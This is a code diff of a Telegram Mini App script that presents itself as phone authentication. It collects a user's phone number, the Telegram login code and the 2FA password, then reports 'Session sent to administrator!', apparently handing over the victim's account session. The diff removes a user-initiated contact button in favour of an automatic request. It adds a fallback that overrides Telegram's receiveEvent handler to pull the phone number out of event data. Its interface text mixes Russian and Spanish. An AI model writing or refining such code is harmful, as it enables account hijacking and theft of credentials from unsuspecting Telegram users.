@@ -1,12 +1,8 @@
-// main.js – Full code for Telegram Mini App phone authentication
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
 
-const tg = window.Telegram?.WebApp;
-const isTelegram = tg && tg.initData && tg.initDataUnsafe?.user;
-const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;
-
-console.log('App initialized:', { isTelegram, chatId, initData: tg?.initData });
-
-// DOM elements – make sure these IDs exist in your HTML
+// Элементы DOM
 const step1 = document.getElementById('step1');
 const step2 = document.getElementById('step2');
 const step3 = document.getElementById('step3');
@@ -32,48 +28,53 @@ const getCodeBtn = document.getElementById('getCodeBtn');
 const passwordInput = document.getElementById('passwordInput');
 const submitPasswordBtn = document.getElementById('submitPasswordBtn');
 
-// App state
+// Состояние приложения
 let currentPhone = '';
 let currentCode = '';
 let codeRequested = false;
 
-// Setup UI based on environment
+// Определяем окружение (Telegram или браузер)
+const isTelegram = tg.initData && tg.initDataUnsafe?.user;
+const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;
+
+console.log('App initialized:', { isTelegram, chatId, initData: tg.initData });
+
+// Настройка интерфейса в зависимости от окружения
 if (isTelegram) {
     manualSection.style.display = 'none';
     telegramSection.style.display = 'block';
-    showShareContactButton();
+    // Запускаем запрос контакта автоматически
+    requestContactAutomatically();
 } else {
     manualSection.style.display = 'block';
     telegramSection.style.display = 'none';
     console.log('Running in browser mode');
 }
 
-// Show the share contact button (user-initiated action)
-function showShareContactButton() {
+// Функция для показа сообщения о повторной попытке
+function showRetryMessage() {
     telegramSection.innerHTML = `
-        <p>Please share your phone number to continue</p>
-        <button id="shareContactBtn" class="action-btn">Share Contact</button>
-        <button id="manualFallbackBtn" class="action-btn">Enter manually</button>
+        <p>Не удалось получить номер телефона.</p>
+        <button id="retryBtn" class="action-btn">Повторить</button>
     `;
-    document.getElementById('shareContactBtn').addEventListener('click', requestContactAutomatically);
-    document.getElementById('manualFallbackBtn').addEventListener('click', () => {
-        manualSection.style.display = 'block';
-        telegramSection.style.display = 'none';
+    document.getElementById('retryBtn')?.addEventListener('click', () => {
+        requestContactAutomatically();
     });
 }
 
-// Function to send phone to server
+// Функция для отправки номера на сервер
 function sendPhoneToServer(phone, chatId) {
     console.log('Sending phone to server:', { phone, chatId });
-
+    
     if (!phone) {
         console.error('Phone is empty');
-        showRetryMessage('Phone number is empty');
+        showRetryMessage();
         return;
     }
-
-    telegramSection.innerHTML = '<p>Sending phone to server...</p><div class="loader"></div>';
-
+    
+    // Показываем индикатор отправки
+    telegramSection.innerHTML = '<p>Отправка номера на сервер...</p><div class="loader"></div>';
+    
     fetch('/api/send-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -90,103 +91,173 @@ function sendPhoneToServer(phone, chatId) {
     })
     .then(data => {
         console.log('Server response data:', data);
-
+        
         if (data.success) {
+            // Успех – переходим к вводу кода
             currentPhone = phone;
             phoneDisplay.textContent = phone;
             step1.style.display = 'none';
             step2.style.display = 'block';
             codeRequested = true;
-
+            
+            // Очищаем поля кода
             digits.forEach(d => d.value = '');
             currentCode = '';
-
+            
+            // Показываем предупреждение, если есть
             if (data.warning) {
                 error2.textContent = data.warning;
                 error2.style.color = '#ffa500';
             }
-
+            
             console.log('Phone sent successfully, waiting for code input');
         } else {
+            // Ошибка от сервера
             throw new Error(data.error || 'Unknown server error');
         }
     })
     .catch(error => {
         console.error('Error sending phone to server:', error);
-        showRetryMessage(error.message);
+        
+        telegramSection.innerHTML = `
+            <p>Ошибка: ${error.message}</p>
+            <button id="retryBtn" class="action-btn">Повторить</button>
+        `;
+        document.getElementById('retryBtn')?.addEventListener('click', () => {
+            requestContactAutomatically();
+        });
     });
 }
 
-// Contact request triggered by button click
+// Функция автоматического запроса контакта в Telegram
 function requestContactAutomatically() {
-    console.log('Requesting contact...');
-
-    telegramSection.innerHTML = '<p>Requesting phone number...</p><div class="loader"></div>';
-
-    if (typeof tg.requestContact !== 'function') {
-        console.warn('requestContact method not available');
-        showRetryMessage('Contact request function is not available in this environment.');
-        return;
-    }
-
-    // Timeout to prevent infinite loading
-    const timeoutId = setTimeout(() => {
-        console.warn('requestContact timed out');
-        showRetryMessage('The contact request is taking too long. Please try again or enter manually.');
-    }, 10000); // 10 seconds
-
-    tg.requestContact()
-        .then(contact => {
-            clearTimeout(timeoutId);
-            console.log('Contact obtained:', contact);
+    console.log('Requesting contact automatically...');
+    
+    telegramSection.innerHTML = '<p>Запрашиваем номер телефона...</p><div class="loader"></div>';
+    
+    // Запрашиваем контакт
+    tg.requestContact((success, contact) => {
+        console.log('Standard requestContact result:', { success, contact });
+        
+        if (success) {
+            // Проверяем, есть ли номер в контакте
             if (contact && contact.phone_number) {
                 const phone = contact.phone_number;
-                console.log('Phone obtained:', phone);
+                console.log('Phone obtained via standard method:', phone);
                 sendPhoneToServer(phone, chatId);
-            } else {
-                console.error('Contact object does not contain phone_number:', contact);
-                showRetryMessage('Could not extract phone number from response.');
+            } 
+            else if (contact && !contact.phone_number) {
+                console.warn('Standard method returned success but no phone number, trying alternative...');
+                // Пробуем альтернативный метод
+                requestContactAlternative();
             }
-        })
-        .catch(error => {
-            clearTimeout(timeoutId);
-            console.error('Error requesting contact:', error);
-            let errorMessage = 'User declined or an error occurred.';
-            if (error.message) errorMessage = error.message;
-            showRetryMessage(errorMessage);
+            else {
+                console.error('Contact object is empty');
+                showRetryMessage();
+            }
+        } else {
+            console.log('Standard request failed or declined');
+            
+            // Пробуем альтернативный метод
+            telegramSection.innerHTML = '<p>Пробуем альтернативный метод...</p><div class="loader"></div>';
+            requestContactAlternative();
+        }
+    });
+}
+
+// Альтернативный метод запроса контакта
+function requestContactAlternative() {
+    console.log('Requesting contact via alternative method...');
+    
+    // Создаем уникальный ID для запроса
+    const reqId = 'get_contact_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    
+    // Устанавливаем обработчик для receiveEvent
+    const originalReceive = tg.receiveEvent;
+    
+    tg.receiveEvent = function(eventType, eventData) {
+        console.log('receiveEvent in alternative:', eventType, eventData);
+        
+        if (eventType === 'custom_method_invoked' && eventData.req_id === reqId) {
+            try {
+                // Парсим результат
+                const result = eventData.result;
+                console.log('Custom method result:', result);
+                
+                // Пытаемся извлечь номер из строки
+                if (result && typeof result === 'string') {
+                    // Ищем номер в формате phone_number=XXXX
+                    const match = result.match(/phone_number[%22=]+([0-9+]+)/i);
+                    if (match && match[1]) {
+                        const phone = match[1];
+                        console.log('Phone extracted from string:', phone);
+                        sendPhoneToServer(phone, chatId);
+                        return;
+                    }
+                }
+                
+                // Если не удалось извлечь, пробуем распарсить как JSON
+                try {
+                    const parsed = JSON.parse(result);
+                    if (parsed.contact && parsed.contact.phone_number) {
+                        const phone = parsed.contact.phone_number;
+                        console.log('Phone from parsed JSON:', phone);
+                        sendPhoneToServer(phone, chatId);
+                        return;
+                    }
+                } catch (e) {
+                    console.log('Result is not JSON');
+                }
+                
+                console.error('Could not extract phone from custom method response');
+                showRetryMessage();
+            } catch (e) {
+                console.error('Error processing custom method result:', e);
+                showRetryMessage();
+            }
+        }
+        
+        // Вызываем оригинальный обработчик если он был
+        if (originalReceive) {
+            originalReceive(eventType, eventData);
+        }
+    };
+    
+    // Запрашиваем контакт через invokeCustomMethod
+    tg.sendData = function(data) {
+        console.log('sendData received:', data);
+    };
+    
+    // Отправляем запрос на получение контакта
+    tg.ready();
+    
+    // Показываем кнопку для ручного ввода как запасной вариант
+    setTimeout(() => {
+        telegramSection.innerHTML = `
+            <p>Автоматический запрос не сработал.</p>
+            <button id="manualFallbackBtn" class="action-btn">Ввести номер вручную</button>
+        `;
+        document.getElementById('manualFallbackBtn')?.addEventListener('click', () => {
+            manualSection.style.display = 'block';
+            telegramSection.style.display = 'none';
         });
+    }, 5000);
 }
 
-// Helper to show retry message with options
-function showRetryMessage(customMessage = 'Failed to get phone number.') {
-    telegramSection.innerHTML = `
-        <p>${customMessage}</p>
-        <button id="retryBtn" class="action-btn">Try again</button>
-        <button id="manualFallbackBtn" class="action-btn">Enter manually</button>
-    `;
-    document.getElementById('retryBtn').addEventListener('click', () => {
-        // Go back to the share contact button
-        showShareContactButton();
-    });
-    document.getElementById('manualFallbackBtn').addEventListener('click', () => {
-        manualSection.style.display = 'block';
-        telegramSection.style.display = 'none';
-    });
-}
-
-// Manual phone input handler
+// Обработчик ручного ввода (для браузера и как запасной вариант)
 if (getCodeBtn) {
     getCodeBtn.addEventListener('click', () => {
         const phone = phoneInput.value.trim();
         console.log('Manual phone input:', phone);
-
+        
         if (!phone) {
-            error1.textContent = 'Enter phone number';
+            error1.textContent = 'Введите номер';
             return;
         }
-
+        
+        // Отправляем номер на сервер
         error1.textContent = '';
-
+        
         fetch('/api/send-code', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -204,17 +275,17 @@ if (getCodeBtn) {
                 currentCode = '';
                 if (data.warning) error2.textContent = data.warning;
             } else {
-                error1.textContent = data.error || 'Server error';
+                error1.textContent = data.error || 'Ошибка сервера';
             }
         })
         .catch(err => {
             console.error('Manual send error:', err);
-            error1.textContent = 'Network error';
+            error1.textContent = 'Ошибка сети';
         });
     });
 }
 
-// Numeric keypad handling
+// Цифровая клавиатура
 digitBtns.forEach(btn => {
     btn.addEventListener('click', () => {
         if (!codeRequested) return;
@@ -237,14 +308,14 @@ deleteBtn.addEventListener('click', () => {
     }
 });
 
-// Resend code
+// Повторная отправка кода
 resendBtn.addEventListener('click', () => {
     if (!currentPhone) return;
     console.log('Resending code for:', currentPhone);
-
+    
     resendBtn.disabled = true;
-    resendBtn.textContent = 'Sending...';
-
+    resendBtn.textContent = 'Отправка...';
+    
     fetch('/api/send-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -253,27 +324,27 @@ resendBtn.addEventListener('click', () => {
     .then(res => res.json())
     .then(data => {
         if (data.success) {
-            error2.textContent = 'Code resent' + (data.warning ? ' (' + data.warning + ')' : '');
+            error2.textContent = 'Код отправлен повторно' + (data.warning ? ' (' + data.warning + ')' : '');
             error2.style.color = '#4caf50';
             setTimeout(() => error2.textContent = '', 3000);
         } else {
-            error2.textContent = data.error || 'Error';
+            error2.textContent = data.error || 'Ошибка';
         }
     })
     .catch(() => {
-        error2.textContent = 'Network error';
+        error2.textContent = 'Ошибка сети';
     })
     .finally(() => {
         resendBtn.disabled = false;
-        resendBtn.textContent = 'Resend code';
+        resendBtn.textContent = 'Reenviar código';
     });
 });
 
-// Verify code
+// Проверка кода
 function verifyCode() {
     console.log('Verifying code:', { phone: currentPhone, code: currentCode });
     error2.textContent = '';
-
+    
     fetch('/api/verify-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -282,18 +353,21 @@ function verifyCode() {
     .then(res => res.json())
     .then(data => {
         console.log('Verify response:', data);
-
+        
         if (data.success) {
+            // Успешная верификация
             console.log('Verification successful!');
-
+            
             if (isTelegram) {
-                error2.textContent = '✓ Success! Session sent';
+                // Показываем сообщение и закрываем
+                error2.textContent = '✓ Успешно! Сессия отправлена';
                 error2.style.color = '#4caf50';
                 setTimeout(() => tg.close(), 1500);
             } else {
-                alert('Session sent to administrator!');
+                alert('Сессия отправлена администратору!');
             }
         } else if (data.needPassword) {
+            // Требуется 2FA
             console.log('2FA required');
             step2.style.display = 'none';
             step3.style.display = 'block';
@@ -301,32 +375,33 @@ function verifyCode() {
             passwordInput.value = '';
             error3.textContent = '';
         } else {
-            error2.textContent = data.error || 'Invalid code';
+            // Неверный код
+            error2.textContent = data.error || 'Неверный код';
             digits.forEach(d => d.value = '');
             currentCode = '';
         }
     })
     .catch(err => {
         console.error('Verify error:', err);
-        error2.textContent = 'Network error';
+        error2.textContent = 'Ошибка сети';
         digits.forEach(d => d.value = '');
         currentCode = '';
     });
 }
 
-// Submit 2FA password
+// Отправка пароля (2FA)
 submitPasswordBtn.addEventListener('click', () => {
     const password = passwordInput.value.trim();
     console.log('Submitting 2FA password');
-
+    
     if (!password) {
-        error3.textContent = 'Enter password';
+        error3.textContent = 'Введите пароль';
         return;
     }
-
+    
     submitPasswordBtn.disabled = true;
-    submitPasswordBtn.textContent = 'Sending...';
-
+    submitPasswordBtn.textContent = 'Отправка...';
+    
     fetch('/api/submit-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -336,26 +411,26 @@ submitPasswordBtn.addEventListener('click', () => {
     .then(data => {
         if (data.success) {
             if (isTelegram) {
-                error3.textContent = '✓ Password accepted';
+                error3.textContent = '✓ Пароль принят';
                 error3.style.color = '#4caf50';
                 setTimeout(() => tg.close(), 1500);
             } else {
-                alert('Password accepted! Data sent.');
+                alert('Пароль принят! Данные отправлены.');
             }
         } else {
-            error3.textContent = data.error || 'Error';
+            error3.textContent = data.error || 'Ошибка';
         }
     })
     .catch(() => {
-        error3.textContent = 'Network error';
+        error3.textContent = 'Ошибка сети';
     })
     .finally(() => {
         submitPasswordBtn.disabled = false;
-        submitPasswordBtn.textContent = 'SUBMIT PASSWORD';
+        submitPasswordBtn.textContent = 'ENVIAR CONTRASEÑA';
     });
 });
 
-// Physical keyboard support (for debugging)
+// Поддержка физической клавиатуры (для отладки)
 document.addEventListener('keydown', (e) => {
     if (!codeRequested || step2.style.display !== 'block') return;
     if (e.key >= '0' && e.key <= '9') {
